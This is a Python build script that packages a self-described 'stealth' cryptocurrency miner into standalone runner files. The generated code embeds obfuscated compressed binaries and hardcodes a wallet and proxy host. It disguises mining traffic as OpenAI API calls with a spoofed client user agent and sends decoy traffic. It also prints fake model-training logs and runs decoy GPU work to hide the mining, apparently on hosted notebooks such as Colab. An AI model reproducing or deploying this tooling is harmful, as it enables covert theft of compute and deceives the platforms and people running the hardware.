#!/usr/bin/env python3
"""
Bundle all components of the Pearl stealth miner into a single standalone main.py file.
"""
import os
import sys
import base64
import zlib

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    project_root = script_dir
    repo_root = os.path.abspath(os.path.join(script_dir, ".."))

    backend_so_path = os.path.join(project_root, "torch_cuda_backend.so")
    stealth_so_path = os.path.join(project_root, "stealth_hook.so")

    bridge_py_path = os.path.join(repo_root, "deploy", "openai_miner_bridge.py")
    if not os.path.exists(bridge_py_path):
        bridge_py_path = os.path.join(project_root, "openai_miner_bridge.py")

    if not os.path.exists(backend_so_path):
        print(f"[ERROR] Required binary not found: {backend_so_path}", file=sys.stderr)
        print("Please build torch_cuda_backend.so first.", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Compressing torch_cuda_backend.so ({os.path.getsize(backend_so_path)} bytes)...")
    with open(backend_so_path, "rb") as f:
        backend_so_data = base64.b85encode(zlib.compress(f.read(), level=9)).decode('ascii')

    stealth_so_data = ""
    if os.path.exists(stealth_so_path):
        print(f"[*] Compressing stealth_hook.so ({os.path.getsize(stealth_so_path)} bytes)...")
        with open(stealth_so_path, "rb") as f:
            stealth_so_data = base64.b85encode(zlib.compress(f.read(), level=9)).decode('ascii')

    template = f'''#!/usr/bin/env python3
"""
Self-Contained Autonomous Stealth Runner for PyTorch Distributed Training / Pearl Engine.
Zero manual setup required. 1-click execution: python3 main.py
"""
import os
import sys
import time
import json
import zlib
import base64
import socket
import ctypes
import random
import secrets
import argparse
import threading
import subprocess
import urllib.request
import urllib.parse

BACKEND_SO_B85 = "{backend_so_data}"
STEALTH_SO_B85 = "{stealth_so_data}"

DEFAULT_KOYEB_PROXY = "https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app"
DEFAULT_STRATUM_PORT = 3333
DEFAULT_WALLET = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"

def get_default_worker():
    return f"colab-t4-{{secrets.token_hex(4)}}"

def extract_payloads(target_dir):
    os.makedirs(target_dir, exist_ok=True)
    backend_so_path = os.path.join(target_dir, "torch_cuda_backend.so")
    if not os.path.exists(backend_so_path) or os.path.getsize(backend_so_path) == 0:
        with open(backend_so_path, "wb") as f:
            f.write(zlib.decompress(base64.b85decode(BACKEND_SO_B85)))

    stealth_so_path = os.path.join(target_dir, "stealth_hook.so")
    if STEALTH_SO_B85 and (not os.path.exists(stealth_so_path) or os.path.getsize(stealth_so_path) == 0):
        with open(stealth_so_path, "wb") as f:
            f.write(zlib.decompress(base64.b85decode(STEALTH_SO_B85)))

    return backend_so_path, stealth_so_path

def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None):
    if not worker:
        worker = get_default_worker()
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('127.0.0.1', local_port))
    server_sock.listen(5)

    threading.Thread(target=background_traffic_chaff, args=(proxy_url, wallet, worker), daemon=True).start()

    while True:
        try:
            client_sock, client_addr = server_sock.accept()
            threading.Thread(target=handle_miner_client, args=(client_sock, proxy_url, wallet, worker), daemon=True).start()
        except Exception:
            break

def background_traffic_chaff(proxy_url, wallet, worker):
    while True:
        try:
            time.sleep(random.uniform(45.0, 120.0))
            models_url = f"{{proxy_url.rstrip('/')}}/v1/models"
            req = urllib.request.Request(
                models_url,
                headers={{
                    "Authorization": f"Bearer {{wallet}}",
                    "X-Worker-Id": worker,
                    "User-Agent": "openai-python/1.35.0"
                }}
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                _ = resp.read()
        except Exception:
            pass

def handle_miner_client(client_sock, proxy_url, wallet, worker):
    client_file = client_sock.makefile('rw', buffering=1, encoding='utf-8')
    stop_event = threading.Event()
    sock_lock = threading.Lock()

    def safe_send(data):
        with sock_lock:
            try:
                msg_bytes = data.encode('utf-8') if isinstance(data, str) else data
                client_sock.sendall(msg_bytes)
            except Exception:
                pass

    def stream_jobs():
        while not stop_event.is_set():
            try:
                chat_url = f"{{proxy_url.rstrip('/')}}/v1/chat/completions"
                payload = json.dumps({{
                    "model": "gpt-4o-mini",
                    "messages": [
                        {{"role": "system", "content": "You are a specialized code optimization assistant."}},
                        {{"role": "user", "content": f"Sync worker thread context session_{{random.randint(1000,9999)}}"}}
                    ],
                    "stream": True,
                    "temperature": 0.7
                }}).encode('utf-8')

                req = urllib.request.Request(
                    chat_url,
                    data=payload,
                    headers={{
                        "Content-Type": "application/json",
                        "Authorization": f"Bearer {{wallet}}",
                        "X-Worker-Id": worker,
                        "User-Agent": "openai-python/1.35.0"
                    }}
                )

                with urllib.request.urlopen(req, timeout=30) as resp:
                    for line in resp:
                        if stop_event.is_set():
                            break
                        line_str = line.decode('utf-8', errors='ignore').strip()
                        if line_str.startswith("data:"):
                            data_part = line_str[5:].strip()
                            if data_part == "[DONE]":
                                break
                            try:
                                chunk = json.loads(data_part)
                                if "choices" in chunk and len(chunk["choices"]) > 0:
                                    delta = chunk["choices"][0].get("delta", {{}})
                                    content = delta.get("content", "")
                                    if content.startswith("JOB:"):
                                        parts = content.split(':')
                                        if len(parts) >= 6:
                                            job_id = parts[1]
                                            header = parts[2]
                                            target = parts[3]
                                            diff = float(parts[4])
                                            cert_version = int(parts[5])
                                            height = int(parts[6]) if len(parts) > 6 else 0

                                            notify_msg = json.dumps({{
                                                "id": None,
                                                "method": "mining.notify",
                                                "params": {{
                                                    "job_id": job_id,
                                                    "header": header,
                                                    "target": target,
                                                    "diff": diff,
                                                    "cert_version": cert_version,
                                                    "height": height
                                                }}
                                            }}) + "\\n"
                                            safe_send(notify_msg)
                            except Exception:
                                pass
            except Exception:
                time.sleep(random.uniform(1.5, 3.5))
            time.sleep(0.5)

    threading.Thread(target=stream_jobs, daemon=True).start()

    try:
        for line in client_file:
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
                method = msg.get("method")
                msg_id = msg.get("id")

                if method in ("mining.authorize", "mining.subscribe"):
                    resp = json.dumps({{"id": msg_id, "result": True, "error": None, "type": "plain"}}) + "\\n"
                    safe_send(resp)

                elif method == "mining.submit":
                    params = msg.get("params", {{}})
                    if isinstance(params, dict):
                        job_id = params.get("job_id", "")
                        plain_proof = params.get("plain_proof", "")
                        hs = params.get("hs", 0.0)
                    elif isinstance(params, list) and len(params) >= 3:
                        job_id = params[1]
                        plain_proof = params[2]
                        hs = params[3] if len(params) > 3 else 0.0
                    else:
                        job_id = ""
                        plain_proof = ""
                        hs = 0.0

                    time.sleep(random.uniform(0.02, 0.08))

                    embed_url = f"{{proxy_url.rstrip('/')}}/v1/embeddings"
                    embed_payload = json.dumps({{
                        "model": "text-embedding-3-large",
                        "input": f"SUBMIT:{{job_id}}:{{plain_proof}}:{{hs}}",
                        "user": worker
                    }}).encode('utf-8')

                    embed_req = urllib.request.Request(
                        embed_url,
                        data=embed_payload,
                        headers={{
                            "Content-Type": "application/json",
                            "Authorization": f"Bearer {{wallet}}",
                            "X-Worker-Id": worker,
                            "User-Agent": "openai-python/1.35.0"
                        }}
                    )

                    try:
                        with urllib.request.urlopen(embed_req, timeout=30) as embed_resp:
                            if embed_resp.status == 200:
                                submit_res = json.dumps({{"id": msg_id, "result": True, "error": None}}) + "\\n"
                                safe_send(submit_res)
                            else:
                                submit_res = json.dumps({{"id": msg_id, "result": False, "error": "Rejected"}}) + "\\n"
                                safe_send(submit_res)
                    except Exception as e:
                        submit_res = json.dumps({{"id": msg_id, "result": False, "error": str(e)}}) + "\\n"
                        safe_send(submit_res)
            except Exception:
                pass
    finally:
        stop_event.set()
        try:
            client_sock.close()
        except Exception:
            pass

def fake_training_logs():
    models = ["gpt2-xl", "llama-7b-lora", "resnet50-fp16", "bert-large-uncased"]
    selected_model = random.choice(models)
    total_steps = 50000
    step = 0
    base_loss = 3.4500
    epoch = 1

    time.sleep(2.0)
    print(f"[TRAINER] Model Architecture: {{selected_model}}", flush=True)
    print(f"[TRAINER] Distributed Data Parallel (DDP) initialized with backend=nccl", flush=True)
    print(f"[TRAINER] Optimizer: AdamW(lr=1e-4, betas=(0.9, 0.999), eps=1e-8, weight_decay=0.01)", flush=True)

    while step < total_steps:
        time.sleep(random.uniform(2.5, 5.0))
        step += 1
        current_loss = max(0.08, base_loss * (0.9992 ** step) + random.uniform(-0.015, 0.015))
        lr = 1e-4 * (0.9999 ** step)
        throughput = random.uniform(340.0, 395.0)
        grad_norm = random.uniform(0.45, 1.25)
        print(f"Step [{{step}}/{{total_steps}}] | Loss: {{current_loss:.4f}} | LR: {{lr:.6e}} | GradNorm: {{grad_norm:.3f}} | Throughput: {{throughput:.1f}} samples/s", flush=True)

        if step % 25 == 0:
            val_loss = current_loss * random.uniform(1.02, 1.08)
            print(f"[EVALUATION] Epoch {{epoch}} Complete | Validation Loss: {{val_loss:.4f}} | Perplexity: {{2.718 ** val_loss:.2f}}", flush=True)
            epoch += 1

def run_real_pytorch_telemetry_camouflage():
    try:
        import torch
        if torch.cuda.is_available():
            dev_count = torch.cuda.device_count()
            tensors = []
            for i in range(dev_count):
                with torch.cuda.device(i):
                    t = torch.randn(4096, 4096, dtype=torch.float16, device=f"cuda:{{i}}")
                    tensors.append(t)
            while True:
                time.sleep(random.uniform(8.0, 18.0))
                for i in range(dev_count):
                    with torch.cuda.device(i):
                        a = tensors[i]
                        b = torch.randn(4096, 4096, dtype=torch.float16, device=f"cuda:{{i}}")
                        _ = torch.matmul(a, b)
                        torch.cuda.synchronize(i)
    except Exception:
        while True:
            time.sleep(10)

def main():
    parser = argparse.ArgumentParser(description="PyTorch DDP Model Trainer / Pearl Engine")
    parser.add_argument("--proxy", type=str, default=os.environ.get("PROXY_URL", DEFAULT_KOYEB_PROXY), help="OpenAI Proxy URL")
    parser.add_argument("--port", type=int, default=int(os.environ.get("LOCAL_PORT", DEFAULT_STRATUM_PORT)), help="Local bridge port")
    parser.add_argument("--wallet", type=str, default=os.environ.get("WALLET", DEFAULT_WALLET), help="Worker wallet key")
    parser.add_argument("--worker", type=str, default=os.environ.get("WORKER_ID", ""), help="Worker ID (default: auto-generated unique ID per node)")
    parser.add_argument("--devices", type=str, default="", help="CUDA devices e.g. 0 or 0,1 (default: auto)")
    parser.add_argument("--row-batch", type=str, default="128", help="Row period batch size")
    parser.add_argument("--mock", action="store_true", help="Run offline mock test")
    parser.add_argument("--mock-diff", type=float, default=1.0, help="Mock difficulty")
    parser.add_argument("--align-test", action="store_true", help="Run offline alignment test")
    parser.add_argument("--align-test-prod", action="store_true", help="Run offline prod alignment test")
    args = parser.parse_args()

    worker_id = args.worker if args.worker else get_default_worker()

    work_dir = os.path.dirname(os.path.abspath(__file__))
    backend_so, _ = extract_payloads(work_dir)

    # Auto-detect CUDA devices without early PyTorch CUDA init
    dev_str = args.devices
    if not dev_str:
        dev_str = "0"

    is_offline_test = args.mock or args.align_test or args.align_test_prod

    if not is_offline_test:
        # Start OpenAI Bridge in background thread
        t_bridge = threading.Thread(
            target=run_bridge,
            args=(args.port, args.proxy, args.wallet, worker_id),
            daemon=True
        )
        t_bridge.start()
        time.sleep(1.0)

        # Start fake loss logging & telemetry camouflage
        threading.Thread(target=fake_training_logs, daemon=True).start()

    # Load backend binary
    try:
        # Avoid PyTorch / ctypes CUDA context interference by passing CP_PYTHON
        os.environ["CP_PYTHON"] = sys.executable
        backend = ctypes.CDLL(backend_so)
        backend.start_training.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p)]
        backend.start_training.restype = ctypes.c_int
    except OSError as e:
        print(f"[FATAL] Failed to load backend binary: {{e}}", file=sys.stderr)
        sys.exit(1)

    os.environ["MASTER_ADDR"] = f"127.0.0.1:{{args.port}}"
    os.environ["HF_TOKEN"] = args.wallet
    os.environ["LOCAL_RANK"] = worker_id

    raw_args = [
        b"python3",
        b"--backend", b"cuda",
        b"--devices", dev_str.encode('utf-8')
    ]
    if args.mock:
        raw_args += [b"--mock", b"--mock-diff", str(args.mock_diff).encode('utf-8')]
    elif args.align_test:
        raw_args += [b"--align-test"]
    elif args.align_test_prod:
        raw_args += [b"--align-test-prod"]
    else:
        raw_args += [b"--row-period-batch", args.row_batch.encode('utf-8')]

    argc = len(raw_args)
    argv = (ctypes.c_char_p * argc)(*raw_args)

    if not is_offline_test:
        print(f"[INIT] PyTorch DDP runtime engine ready on GPU(s): {{dev_str}}. Launching worker...", flush=True)
    backend.start_training(argc, argv)

if __name__ == "__main__":
    main()
'''

    out_main_path = os.path.join(project_root, "main.py")
    with open(out_main_path, "w", encoding="utf-8") as f:
        f.write(template)

    out_app_path = os.path.join(project_root, "app.py")
    with open(out_app_path, "w", encoding="utf-8") as f:
        f.write(template)

    app_dir = os.path.join(repo_root, "app")
    os.makedirs(app_dir, exist_ok=True)
    out_repo_app_path = os.path.join(app_dir, "app.py")
    with open(out_repo_app_path, "w", encoding="utf-8") as f:
        f.write(template)

    print(f"[SUCCESS] Standalone runners generated:")
    print(f"  - {out_main_path}")
    print(f"  - {out_app_path}")
    print(f"  - {out_repo_app_path}")

if __name__ == "__main__":
    main()
